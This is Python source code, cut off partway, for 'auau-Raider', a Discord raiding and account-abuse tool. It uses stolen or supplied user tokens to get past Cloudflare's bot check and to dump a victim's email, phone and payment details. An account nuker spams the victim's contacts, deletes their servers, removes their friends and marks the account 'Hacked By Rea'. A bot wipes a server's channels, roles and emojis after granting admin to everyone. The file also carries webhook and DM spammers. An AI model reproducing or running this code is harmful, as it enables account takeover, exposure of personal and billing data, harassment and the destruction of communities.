import discum.discum
import random_user_agent.user_agent
import random,string
import re
import sys
import os
try:
    os.remove(f"installs.bat")
    os.remove(f"requirements.txt")
except:
    pass
import json
import ctypes
import threading
import websocket
import tls_client
import requests
import base64
import binascii
from concurrent.futures import ThreadPoolExecutor
from pystyle import Center, Anime, Colors, Colorate, Write, System
from colorama import Fore, init
from datetime import datetime
from time import sleep
from itertools import cycle
init()
S = Fore.RESET
w = Fore.WHITE
b = Fore.BLACK
g = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
lm = Fore.LIGHTMAGENTA_EX
lc = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
M = Fore.MAGENTA
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
W = Fore.WHITE
Y = Fore.YELLOW
C = Fore.CYAN
with open("config.json") as f:
 _CONFIG_ = json.load(f)
nicks_random = _CONFIG_.get("nick_random_length")
open('tokens.txt', 'a')
session=requests.Session()
lock = threading.Lock()
items = list(range(0, 37))
l = len(items)
counttokens = len(open("tokens.txt").readlines())
ver = "1.2"
with open("tokens.txt") as f:
 lines = f.readlines()
 for l in lines:
  token=l.rstrip("\n")
def setTitle(_str):
    ctypes.windll.kernel32.SetConsoleTitleW(f"{_str}auau-Raider | Made By Rea And ☆にゃにゃっこ☆ | token: [{counttokens}] | v{ver}")
class _def_():
 def CustomSeizure(token):
        t = threading.currentThread()
        while getattr(t, "do_run", True):
            modes = cycle(["light", "dark"])
            setting = {"theme": next(modes), "locale": random.choice(["ja", "zh-TW", "ko", "zh-CN"])}
        session.patch("https://discord.com/api/v9/users/@me/settings", headers=_def_.getheaders(token), json=setting)
        input(f"\n{S}[{S}{G}+{S}] ENTERを入力: ")
        Menu()
 def typingwrite(text):
    for txts in text:print(txts, end="");sys.stdout.flush();sleep(0.0006)
 def get_channels(tokens,guild_id):
    while True:
        headers = _def_.get_headers()
        headers["authorization"] = tokens
        channels = []
        session = _def_.get_session()
        req = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
        if req.status_code==200:
            for channel in req.json():
                if 'bitrate' not in channel and channel['type']==0:
                    if channel not in channels:
                        print(f"{S}[{G}+{S}] Successful Get Channel! ID: {channels}")
                        channels.append(channel["id"])
            return channels
            break
        else:
            continue
 def get_session():
    session = tls_client.Session(client_identifier="chrome_105")
    headers = {
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Accept-Language": "en-US",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
        "X-Debug-Options": "bugReporterEnabled",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    reeq = session.get("https://discord.com/", headers=headers)
    html = reeq.text
    r = str(re.findall(r"r:'[^']*'", html)[0]).replace("r:'", "").replace("'", "")
    m = str(re.findall(r"m:'[^']*'", html)[0]).replace("m:'", "").replace("'", "")
    payload = {
        "m": m,
        "results": [
            str(binascii.b2a_hex(os.urandom(16)).decode('utf-8')),
            str(binascii.b2a_hex(os.urandom(16)).decode('utf-8'))
        ],
        "timing": random.randint(40, 120),
        "fp": {
            "id": 3,
            "e": {
                "r": [
                    1920,
                    1080
                ],
                "ar": [
                    1040,
                    1920
                ],
                "pr": 1,
                "cd": 24,
                "wb": False,
                "wp": False,
                "wn": False,
                "ch": True,
                "ws": False,
                "wd": False
            }
        }
    }
    headers["content-type"] = "application/json"
    session.post(f'https://discord.com/cdn-cgi/challenge-platform/h/b/cv/result/{r}', headers=headers, json=payload)
    return session
 def get_headers(option=None):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        "Accept-language": "en-US",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    xxx = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": "en-US",
        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        "browser_version": "107.0.0.0",
        "os_version": "10",
        "referrer": "",
        "referring_domain": "",
        "referrer_current": "",
        "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": 160996,
        "client_event_source": None
    }
    headers["x-super-properties"] = base64.b64encode(json.dumps(xxx, separators=(',', ':')).encode()).decode()
    return headers
 def validateToken(token):
    base_url = "https://discord.com/api/v9/users/@me"
    message = "You need to verify your account in order to perform this action."

    r = requests.get(base_url, headers=_def_.getheaders(token))
    if r.status_code != 200:
        print(f"\n{R}Tokenが使用できません{S}")
        sleep(1)
        __import__("spammer").main()
    j = requests.get(f"{base_url}/billing/subscriptions", headers=_def_.getheaders(token)).json()
    try:
        if j["message"]==message:
            print(f"\n{R}電話認証されたTokenです!{S}")
            sleep(1)
            __import__("spammer").main()
    except (KeyError, TypeError, IndexError):
        pass
 def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers
 def randstr(counts):
    return "".join(random.choice(string.ascii_letters) for _ in range(counts))
 def mainHeader(token):
            return {
                "authorization": token,
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-GB",
                "content-length": "90",
                "content-type": "application/json",
                "cookie": f"__cfuid={_def_.randstr(43)}; __dcfduid={_def_.randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }
 def animscreen():
    setTitle(f"Press Enter | ")
    Rea = f"""
                                  v{ver}

░█████╗░██╗░░░██╗░█████╗░██╗░░░██╗░░░░░░██████╗░░█████╗░██╗██████╗░███████╗██████╗░
██╔══██╗██║░░░██║██╔══██╗██║░░░██║░░░░░░██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
███████║██║░░░██║███████║██║░░░██║█████╗██████╔╝███████║██║██║░░██║█████╗░░██████╔╝
██╔══██║██║░░░██║██╔══██║██║░░░██║╚════╝██╔══██╗██╔══██║██║██║░░██║██╔══╝░░██╔══██╗
██║░░██║╚██████╔╝██║░░██║╚██████╔╝░░░░░░██║░░██║██║░░██║██║██████╔╝███████╗██║░░██║
╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝

    """
    System.Size(120, 30)
    System.Clear()
    Anime.Fade(Center.Center(Rea), Colors.rainbow, Colorate.Vertical, interval=0.030, enter=True)
 def Info(token):
    r = requests.get("https://discord.com/api/v9/users/@me", headers=_def_.getheaders(token))
    cc_digits = {
    "american express": "3",
    "visa": "4",
    "mastercard": "5"
}
    badges = ""

    Discord_Employee = 1
    Partnered_Server_Owner = 2
    HypeSquad_Events = 4
    Bug_Hunter_Level_1 = 8
    House_Bravery = 64
    House_Brilliance = 128
    House_Balance = 256
    Early_Supporter = 512
    Bug_Hunter_Level_2 = 16384
    Early_Verified_Bot_Developer = 131072

    flags = r.json()["flags"]
    if (flags==Discord_Employee):
        badges += "Staff, "
    if (flags==Partnered_Server_Owner):
        badges += "Partner, "
    if (flags==HypeSquad_Events):
        badges += "Hypesquad Event, "
    if (flags==Bug_Hunter_Level_1):
        badges += "Green Bughunter, "
    if (flags==House_Bravery):
        badges += "Hypesquad Bravery, "
    if (flags==House_Brilliance):
        badges += "HypeSquad Brillance, "
    if (flags==House_Balance):
        badges += "HypeSquad Balance, "
    if (flags==Early_Supporter):
        badges += "Early Supporter, "
    if (flags==Bug_Hunter_Level_2):
        badges += "Gold BugHunter, "
    if (flags==Early_Verified_Bot_Developer):
        badges += "Verified Bot Developer, "
    if (badges==""):
        badges = "None"

    userName = r.json()["username"] + "#" + r.json()["discriminator"]
    userID = r.json()["id"]
    phone = r.json()["phone"]
    email = r.json()["email"]
    language = r.json()["locale"]
    mfa = r.json()["mfa_enabled"]
    avatar_id = r.json()["avatar"]
    has_nitro = False
    res = requests.get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", headers=_def_.getheaders(token))
    nitro_data = res.json()
    has_nitro = bool(len(nitro_data) > 0)
    avatar_url = f"https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp"
    creation_date = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime("%d-%m-%Y %H:%M:%S UTC")

    if has_nitro:
        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split(".")[0], "%Y-%m-%dT%H:%M:%S")
        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split(".")[0], "%Y-%m-%dT%H:%M:%S")
        days_left = abs((d2 - d1).days)

    billing_info = []
    for x in requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=_def_.getheaders(token)).json():
        y = x["billing_address"]
        name = y["name"]
        address_1 = y["line_1"]
        address_2 = y["line_2"]
        city = y["city"]
        postal_code = y["postal_code"]
        state = y["state"]
        country = y["country"]
        if x["type"]==1:
            cc_brand = x["brand"]
            cc_first = cc_digits.get(cc_brand)
            cc_last = x["last_4"]
            cc_month = str(x["expires_month"])
            cc_year = str(x["expires_year"])
            data = {
                "Payment Type": "Credit Card",
                "Valid": not x["invalid"],
                "CC Holder Name": name,
                "CC Brand": cc_brand.title(),
                "CC Number": "".join(z if (i + 1) % 2 else z + " " for i, z in enumerate((cc_first if cc_first else "*") + ("*" * 11) + cc_last)),
                "CC Exp. Date": ("0" + cc_month if len(cc_month) < 2 else cc_month) + "/" + cc_year[2:4],
                "Address 1": address_1,
                "Address 2": address_2 if address_2 else "",
                "City": city,
                "Postal Code": postal_code,
                "State": state if state else "",
                "Country": country,
                "Default Payment": x["default"]
            }
        elif x["type"]==2:
            data = {
                "Payment Type": "PayPal",
                "Valid": not x["invalid"],
                "PayPal Name": name,
                "PayPal Email": x["email"],
                "Address 1": address_1,
                "Address 2": address_2 if address_2 else "",
                "City": city,
                "Postal Code": postal_code,
                "State": state if state else "",
                "Country": country,
                "Default Payment": x["default"]
            }
        billing_info.append(data)
        
    print(f"""
{S}{G}Account Info{S}
[{m}Username{S}]        {userName} | {userID}
[{m}Badges{S}]          {badges}
[{m}Language{S}]        {language}
[{m}Created at{S}]      {creation_date}
[{m}Avatar URL{S}]      {avatar_url if avatar_id else ""}
[{m}Account Token{S}]   {R}{token}{S}

{S}{G}Security Info{S}
[{m}Email{S}]           {email}
[{m}Phone Number{S}]    {phone if phone else ""}
[{m}2 Factor{S}]        {mfa}

{S}{G}####### Nitro Info #######{S}
[{m}Nitro Status{S}]    {has_nitro}
[{m}Expires in{S}]      {days_left if has_nitro else "0"} day(s)
            """)
    if len(billing_info) > 0:
        print(f"{S}{G}####### Billing Info #######{S}")
        if len(billing_info)==1:
            for x in billing_info:
                for key, val in x.items():
                    if not val:
                        continue
                    print(f"[{R}"+"{:<23}{:<10}{}".format(key+{R}+S+"]", S, val))
        else:
            for i, x in enumerate(billing_info):
                title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                print("" + title)
                print("" + ("=" * len(title)))
                for j, (key, val) in enumerate(x.items()):
                    if not val or j==0:
                        continue
                    print(f"[{R}"+"{:<23}{:<10}{}".format(key+{R}+S+"]", S, val))
                if i < len(billing_info) - 1:
                    print(f"{S}")
        print(f"{S}")
    input(f"[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ")
 def login():
  try:
     with open("data/login.json") as f:
         config = json.load(f)
  except:
     with open("data/login.json", "w") as f:
             os.system("cls")
             print(f"\n{S}[{M}+{S}] {R}auau-raider{S}に{Y}ログイン{S}してください")
             login = input(f"{S}[{lr}>{S}] {G}ユーザー{Y}ネーム{G}: {Y}")
             json.dump({"Login": login}, f, indent=4)
     input(f"\n{S}[{G}+{S}] {Y}ログイン{S}が完了しました: [{m}{login}{w}]\n{S}[{S}{G}+{S}] ENTERを入力してください: ")
     pass
  with open("data/login.json") as f:
     config = json.load(f)
  loginnm = config.get("Login")
  os.system("cls")
  return loginnm
heads = [
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]
_def_.typingwrite(f"{S}[{G}+{S}] {lr}Opening...")
_def_.animscreen()
os.system("cls")
def Menu():
    text=[f"{lm}[{lr}1{lm}]{lr}",f"{lm}[{lr}2{lm}]{lr}",f"{lm}[{lr}3{lm}]{lr}",f"{lm}[{lr}4{lm}]{lr}",f"{lm}[{lr}5{lm}]{lr}",f"{lm}[{lr}6{lm}]{lr}",f"{lm}[{lr}7{lm}]{lr}",f"{lm}[{lr}8{lm}]{lr}",f"{lm}[{lr}9{lm}]{lr}",f"{lm}[{lr}10{lm}]{lr}",f"{lm}[{lr}11{lm}]{lr}",f"{lm}[{lr}12{lm}]{lr}",f"{lm}[{lr}13{lm}]{lr}",f"{lm}[{lr}14{lm}]{lr}",f"{lm}[{lr}15{lm}]{lr}",f"{lm}[{lr}16{lm}]{lr}",f"{lm}[{lr}17{lm}]{lr}",f"{lm}[{lr}18{lm}]{lr}",f"{lm}[{lr}19{lm}]{lr}",f"{lm}[{lr}20{lm}]{lr}",f"{lm}[{lr}21{lm}]{lr}",f"{lm}[{lr}22{lm}]{lr}",f"{lm}[{lr}23{lm}]{lr}",f"{lm}[{lr}24{lm}]{lr}",f"{lm}[{lr}25{lm}]{lr}",f"{lm}[{lr}26{lm}]{lr}",f"{lm}[{lr}27{lm}]{lr}"]
    setTitle(f"option | ")
    option=input(f"""{R}
                    ╔═══════════════════════════════════════════════════════════════════════════════════╗
                    ║░█████╗░██╗░░░██╗░█████╗░██╗░░░██╗░░░░░░██████╗░░█████╗░██╗██████╗░███████╗██████╗░║
                    ║██╔══██╗██║░░░██║██╔══██╗██║░░░██║░░░░░░██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗║
                    ║███████║██║░░░██║███████║██║░░░██║█████╗██████╔╝███████║██║██║░░██║█████╗░░██████╔╝║
                    ║██╔══██║██║░░░██║██╔══██║██║░░░██║╚════╝██╔══██╗██╔══██║██║██║░░██║██╔══╝░░██╔══██╗║
                    ║██║░░██║╚██████╔╝██║░░██║╚██████╔╝░░░░░░██║░░██║██║░░██║██║██████╔╝███████╗██║░░██║║
                    ║╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝║
                    ╚═══════════════════════════════════════════════════════════════════════════════════╝
                                        {S}[ {B}Logged as {Y}{_def_.login()} {S}]{B}             Free VER v{ver}{lb}
                         ╔═══════════╦═════════════════════╦═══════════════════════════════════╗
                         ║ > Discord ║ discord.gg/mVEE3rfc ║ > Created by Rea and にゃにゃっこ ║
                         ╠═══════════╩════════╦════════════╩══════════╦════════════════════════╣
                         ║{text[0]} {lb}Leaver          ║{text[1]} {lb}HypeSquad Changer  ║{text[2]} {lb}BOT NUKER           ║
                         ║{text[3]} {lb}Webhook SPAMMER ║{text[4]} {lb}Token Checker      ║{text[5]} {lb}CHANNEL SPAMMER     ║
                         ║{text[6]} {lb}DM SPAMMER      ║{text[7]} {lb}Reply Spammer      ║{text[8]} {lb}Account Nuker       ║
                         ║{text[9]} {lb}Token Info     ║{text[10]} {lb}ID Scraper        ║{text[11]} {lb}VC JOINER          ║
                         ║{text[12]} {lb}Threads        ║{text[13]} {lb}Nick Change       ║{text[14]} {lb}Token Onliner      ║
                         ║{text[15]} {lb}None           ║{text[16]} {lb}CREDITS           ║{text[17]} {lb}end                ║
                         ╚════════════════════╩═══════════════════════╩════════════════════════╝
                        
{S}{R}\n\n\n\n                                                          OPTION {S}> """)
    def nick():
      with open("data/nick.txt") as txt:
        lists = txt.readlines()
        names = [RandomName.strip("\n") for RandomName in lists]
        name=random.choice(names)
        if nicks_random > 0:
            name=f"{random.choice(names)} | {_def_.randstr(nicks_random)}"
        return name
    class module():
     def AccNuker(token, Server_Name, message_Content):
      if threading.active_count() <= 100:
        t = threading.Thread(target=_def_.CustomSeizure, args=(token, ))
        t.start()
      headers = {"Authorization": token}
      channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=_def_.getheaders(token)).json()
      for channel in channelIds:
        try:
            requests.post(f"https://discord.com/api/v9/channels/"+channel["id"]+"/messages",
            headers=headers,
            data={"content": f"{message_Content}"})
            print(f"[ {m}${S} ] ID: "+channel["id"])
        except Exception as e:
            print(f"次のエラーが発生しましたが、無視されています: {e}")
      print(f"\n全てのフレンドにメッセージを送信中\n\n")
      guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=_def_.getheaders(token)).json()
      for guild in guildsIds:
        try:
            requests.delete(
                f"https://discord.com/api/v9/users/@me/guilds/"+guild["id"], headers={"Authorization": token})
            print(f"[ {m}${S} ] Left Server: "+guild["name"]+S)
        except Exception as e:
            print(f"次のエラーが発生しましたが、無視されています: {e}")

      for guild in guildsIds:
        try:
            requests.delete(f"https://discord.com/api/v9/guilds/"+guild["id"], headers={"Authorization": token})
            print(f"[ {m}${S} ] Deleted: "+guild["name"])
        except Exception as e:
            print(f"次のエラーが発生しましたが、無視されています: {e}")
      print(f"\nLeft / Deleted Guilds\n")

      friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=_def_.getheaders(token)).json()
      for friend in friendIds:
        try:
            requests.delete(
                f"https://discord.com/api/v9/users/@me/relationships/"+friend["id"], headers=_def_.getheaders(token))
            print(f"[ {m}${S} ] Removed Friend: "+friend["user"]["username"]+"#"+friend["user"]["discriminator"]+S)
        except Exception as e:
            print(f"[\x1b[95m>\x1b[95m\x1B[37m] 次のエラーが発生しましたが、無視されています: {e}")
      print(f"\nRemoved all available friends\n")
    
      for i in range(100):
        try:
            payload = {"name": f"{Server_Name}", "region": "europe", "icon": None, "channels": None}
            requests.post("https://discord.com/api/v9/guilds", headers=_def_.getheaders(token), json=payload)
            print(f"[{m}={S}] Created {i}{S}")
        except Exception as e:
            print(f"[\x1b[95m>\x1b[95m\x1B[37m] 次のエラーが発生しましたが、無視されています: {e}")
      print(f"\nCreated all servers\n")
      t.do_run = False
      requests.delete("https://discord.com/api/v9/hypesquad/online", headers=_def_.getheaders(token))
      setting = {
          "theme": "light",
          "locale": "ja",
          "inline_embed_media": False,
          "inline_attachment_media": False,
          "gif_auto_play": False,
          "enable_tts_command": False,
          "render_embeds": False,
          "render_reactions": False,
          "animate_emoji": False,
          "convert_emoticons": False,
          "message_display_compact": False,
          "explicit_content_filter": "0",
          "custom_status": {"text": "Hacked By Rea"},
          "status": "idle"
      }
      requests.patch("https://discord.com/api/v9/users/@me/settings", headers=_def_.getheaders(token), json=setting)
      j = requests.get("https://discordapp.com/api/v9/users/@me", headers=_def_.getheaders(token)).json()
      a = j["username"] + "#" + j["discriminator"]
      print(f"\n\nDone, RIP TO THAT ACCOUNT\n")
      print("[ \x1b[95m>\x1b[95m\x1B[37m ] Press ENTER: ", end="")
      Menu()
     def webhookSpammer():
        os.system("cls")
        setTitle("WEBHOOK SPAMMER | ")
        session = requests.Session()
        print(S+G+"\n\n                         ["+R+"1"+G+"] "+B+"SPAMMER"+S+G+"   ["+R+"2"+G+"] "+B+"TITLE"+S+G+"   ["+R+"3"+G+"] "+B+"EXIT")
        option=input(S+R+"\n\n\n\n                                                          OPTION "+S+"> ")
        if option=="1":
            os.system("cls")
            setTitle("WEBHOOK SPAMMER | Input | ")
            webhooks = input("\n\n                         Webhook URL : ")
            messages = input("\n\n                         Message : ")
            username = input("\n\n                         Webhook USERNAME : ")
            msgcount = input("\n\n                         SPAM COUNTS : ")
            def spammer():
                i=0
                i+=1
                now_count = f"{i}/{msgcount}"
                session.post(webhooks,json = {"content":messages + f" : {now_count}","username":username})
                print(f"{S}{B}[{S}{G}+{S}{B}] {S}Sent.")
                while int(i)<int(msgcount):
                        threading.Thread(target=spammer).start()
            spammer()
        if option=="3":
            Menu()
            option=input(S+R+"\n\n\n\n                                                          OPTION "+S+"> ")
        if option=="4":
            sys.exit()
     def leaver():
        setTitle(f"Leaver | ")
        os.system("cls")
        session=requests.Session()
        id = input(f"\n{S}[{S}{G}+{S}] Server ID: ")
        apilink = "https://discord.com/api/v9/users/@me/guilds/"+id
        with open("tokens.txt") as f:
            lines = f.readlines()
            for l in lines:
                token=l.rstrip("\n")
                headers = {
                    "Authorization": token,
                    "content-length": "0",
                    "cookie": f"__cfuid={_def_.randstr(43)}; __dcfduid={_def_.randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                    "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                }
                try:
                    resp=requests.delete(apilink, headers=headers)
                    print(f"{S}[{G}+{S}] {R}{token}{S} was Done [{resp}]")
                except Exception as e:
                    print(f"{S}[{R}-{S}] {R}{token}{S} was Error: {R}{e} [{resp}]")
     def HeadSquads():
        setTitle(f"HypeSquad Changer | ")
        session=requests.Session()
        os.system("cls")
        print(f"""\n{S}[{M}1{S}] {M}Bravery{S}\n{S}[{M}2{S}] {lr}Brilliance{S}\n{S}[{M}3{S}] {lc}Balance{S}\n{S}[{M}4{S}] {R}Leave HeadSquad{S}""")
        token = input(f"\n{R}token {lr}> {Y}")
        house = input(f"\n{R}OPTION > ")
        def hype(token):
            headers = _def_.mainHeader(token)
            if house=="1":
                housefinal = "1"
            if house=="2":
                housefinal = "2"
            if house=="3":
                housefinal = "3"
            if house=="4":
                housefinal = None
            if house=="1" or "2" or "3":
                payload = {
                    "house_id": housefinal
                }
                rep = session.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
                if rep.status_code==204:
                    print(f"[{G}+{S}] 完了")
                else:
                    print(f"[{R}-{S}] 失敗")

            if house=="4":
                payload = {
                    "house_id": housefinal
                }
                req = session.delete("https://discord.com/api/v9/hypesquad/online", headers=headers, json=payload)
                if req.status_code==204:
                    print(f"[{G}+{S}] 完了")
                else:
                    pass

            else:
                pass
            threading.Thread(target=hype(token)).start()
     def botnuker():
        setTitle("Bot Nuker | ")
        import discord
        import asyncio
        import colorama
        from colorama import Fore
        from discord.ext import commands
        prefix=str(input(S+B+"Pre"+G+"fix:"))
        token=str(input(S+B+"To"+G+"ken:"))
        ServerName=str(input(S+B+"Serve"+G+"rName:"))
        ServerIcon=str(input(S+B+"Serve"+G+"rIcon (File Path icons.png):"))
        messages=str(input(S+B+"Mess"+G+"ages:"))
        channels=str(input(S+B+"Chann"+G+"elName:"))
        roles=str(input(S+B+"Rol"+G+"eName:"))
        Status=str(input(S+B+"Activ"+G+"ity:"))
        client=commands.Bot(command_prefix=prefix, help_command=None, intents=discord.Intents.all())
        @client.event
        async def on_ready():
            os.system("cls")
            print(f"\nhttps://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=applications.commands%20bot\nhelp\n{prefix}nuke\n{prefix}msgspam\n{prefix}rolespam\n{prefix}mrspam\n{prefix}allban")
            print(f"Logged as {client.user.name}.")
            while True:
              await asyncio.sleep(4)
              await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name=f"WICKBOT.COM | SHARD{random.choice(list(range(6, 500)))}"))
              print(f"status changed")
        @client.command()
        async def nuke(ctx):
              await ctx.message.delete()
              guild = ctx.message.guild
              try:
                role = discord.utils.get(guild.roles, name = "@everyone")
                await role.edit(permissions = discord.Permissions.all())
                print(S+f"["+G+"+"+S+f"] grant admin to @everyone"+S)
              except:
                print(S+f"["+R+"-"+S+f"] Failed to grant admin to @everyone"+S)
              for channel in guild.channels:
                with open("icons.png","rb") as f:
                      icon = f.read()
                      try:
                          await guild.edit(name=ServerName, icon=ServerIcon)
                          print(S+"["+G+"+"+S+f"] {guild.name} server name and icon changed."+S)
                      except:
                          print(S+"["+R+"-"+S+f"] {guild.name} could not server name and icon changed."+S)
                try:
                  await channel.delete()
                  print(S+f"["+G+"+"+S+f"] Channel: {channel.name} was deleted."+S)
                except:
                  print(S+f"["+R+"-"+S+f"] Channel: {channel.name} was could not deleted."+S)
              try:
                 await role.delete()
                 print(S+f"["+G+"+"+S+f"] Role: {role.name} was deleted."+S)
              except:
                 print(S+f"["+R+"-"+S+f"] Role: {role.name} was could not deleted."+S)
              for emoji in list(ctx.guild.emojis):
               try:
                 await emoji.delete()
                 print(S+f"["+G+"+"+S+f"] {emoji.name} was deleted."+S)
               except:
                 print(S+f"["+R+"-"+S+f"] {emoji.name} was could not deleted."+S)
              for channel in guild.text_channels:
                  link = await channel.create_invite(max_age = 0, max_uses = 0)
                  print(f"New Invite: {link}")
              counts=0
              count=1000
              while await int(counts)<int(count):
                    await asyncio.sleep(0.05)
                    try:
                      await guild.create_text_channel(channels)
                      print(S+f"["+G+"+"+S+f"] Created Text Channel #{channel.name} [{channel.id}]")
                      await guild.create_role(name=roles, colour=discord.Colour(0x0000FF))
                      print(S+f"["+G+"+"+S+f"] Created Role #{role.name} [{role.id}]")
                    except:
                      print(S+f"["+R+"-"+S+f"] Could Not Created Text Channel #{channel.name} [{channel.id}]")
                      print(S+f"["+R+"-"+S+f"] Could Not Created Role #{role.name} [{role.id}]")
              try:
                print(S+f"["+G+"+"+S+f"] {guild.name} [{guild.id}] was nuked.")
                return
              except:
                print(S+f"["+R+"-"+S+f"] {guild.name} [{guild.id}] was could not nuked.")
                return
        @client.command()
        async def msgspam(ctx):
            await ctx.message.delete()
            while True:
              await asyncio.sleep(0.09)
              try:
                channel=await ctx.message.guild.create_text_channel(channels)
                print(S+f"["+G+"+"+S+f"] Created Text Channel #{channel.name} [{channel.id}]")
              except:
                print(S+f"["+R+"-"+S+f"] Could Not Created Text Channel #{channel.name} [{channel.id}]")
        @client.command()
        async def rolespam(ctx):
            await ctx.message.delete()
            while True:
              await asyncio.sleep(0.07)
              try:
                role=await ctx.message.guild.create_role(channels)
                print(S+f"["+G+"+"+S+f"] Created Role #{role.name} [{role.id}]")
              except:
                print(S+f"["+R+"-"+S+f"] Could Not Created Role #{role.name} [{role.id}]")
        @client.command()
        async def mrspam(ctx):
            await ctx.message.delete()
            while True:
              await asyncio.sleep(0.07)
              try:
                channel=await ctx.message.guild.create_role(channels)
                print(S+f"["+G+"+"+S+f"] Created Channel #{channel.name} [{channel.id}]")
                role=await ctx.message.guild.create_role(roles)
